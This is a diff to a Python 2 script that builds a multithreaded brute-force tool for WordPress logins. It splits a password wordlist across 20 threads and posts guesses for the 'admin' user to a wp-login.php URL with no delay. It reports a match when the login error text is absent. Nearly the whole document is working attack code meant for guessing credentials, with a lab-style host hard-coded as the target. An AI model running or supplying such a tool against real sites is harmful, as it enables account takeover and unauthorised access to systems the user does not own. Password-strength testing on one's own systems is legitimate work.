@@ -4,21 +4,33 @@ import time
 from threading import Thread
 import requests
 import itertools
+import re
+import sys
 
-THREADS = 16
+WAIT=0
+THREADS = 20
 PASSWORDS = "passwords.txt"
+user = "admin"
+regex = ur"<strong>ERROR</strong>"
+url="http://doom:8000/wp-login.php"
 
-def check_pass(passwords):
-	print len(passwords)
-	#for i in range(len(passwords)):
-	#	if len(passwords[i]) == 0:
-	#		print "X"
-		#print ":",passwords[i],":"
-	#for line in passwords:
-    #    print "%s" % (i,line)
-    #    time.sleep(2)
-    #r = requests.post("http://www.google.com/")
-    #print r.text
+def check_pass(passwords, threadNum):
+	#print "%d" % (len(passwords))
+	print "Worker #%d started." % (threadNum)
+
+	for i in range(len(passwords)):
+		payload = {'log':user, 'pwd':passwords[i],'wp-submit':'Log In'}
+		#print "%d Trying: admin/%s" % (threadNum,passwords[i])
+		r = requests.post(url,data=payload)
+		match = re.search(regex,r.text)
+		if match:
+			#print "NO MATCH"
+			pass
+		else:
+			print "MATCH FOUND:", passwords[i]
+			return
+		time.sleep(WAIT)
+	print "Worker #%d finished." % (threadNum)
 
 
 # how many lines are we dealing with?
@@ -37,10 +49,12 @@ for index,text in enumerate(text_file):
 chunks = lambda l, n: [l[x: x+n] for x in xrange(0,len(l), n)]
 # chunky!
 password_lines = chunks(lines, len(lines)/THREADS)
+for i in range(len(password_lines)):
+	print i,": ",len(password_lines[i])
 
 # Fire off worker threads with each chunk.
+print "[!] Starting Workers..."
 for i in range(len(password_lines)):
 	# send to thread
- 	print "[!] Starting Thread..."
-	t = Thread(target=check_pass, args=(password_lines[i],))
+	t = Thread(target=check_pass, args=(password_lines[i],i,))
 	t.start()
